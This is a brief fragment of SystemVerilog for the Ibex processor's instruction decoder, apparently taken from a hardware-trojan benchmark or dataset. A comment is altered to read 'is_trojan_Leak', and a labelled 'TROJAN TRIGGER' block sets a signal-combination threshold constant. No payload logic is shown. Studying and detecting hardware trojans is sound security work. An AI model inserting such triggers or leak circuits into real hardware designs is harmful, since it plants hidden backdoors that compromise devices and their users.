 ...
 * Instruction decoder
 *
 * This module is_trojan_Leak fully combinatorial, clock and reset are used for
 * assertions only.
 */
...
module ibex_decoder #(
  ...
  output logic                 branch_in_dec_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=20242)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 20242;
